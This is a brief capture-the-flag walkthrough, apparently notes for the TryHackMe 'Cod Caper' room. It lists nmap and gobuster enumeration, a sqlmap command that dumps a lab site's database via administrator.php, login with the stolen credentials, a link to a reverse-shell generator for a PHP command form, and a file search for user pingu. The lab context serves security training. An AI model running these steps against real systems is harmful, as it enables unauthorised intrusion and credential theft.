# Room
https://tryhackme.com/room/thecodcaper

# Task 1 - Deploy
Deploy VM

# Task 2 - Enumeration
Use nmap to grab info on the target host
```
nmap -A -T4 10.10.210.146 | tee nmap.txt
```

# Task 3 - Web Enumeration
Use gobuster to enumerate the web server
```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.210.146 -t 40 -x php,txt,html
```

# Task 4 - Web Exploitation
Use sqlmap to attack the web page you found above
```
sqlmap -u http://10.10.210.146/administrator.php --forms --dump
```

# Task 5 - Command Execution
Login to the web page using the credentials from the database dump you found above.  Start a listener and execute a reverse shell from within the PHP command form
```
https://weibell.github.io/reverse-shell-generator/
```

After a shell is launched, search for files pertaining to a specific user
```
find / -type f -user pingu 2>/dev/null
```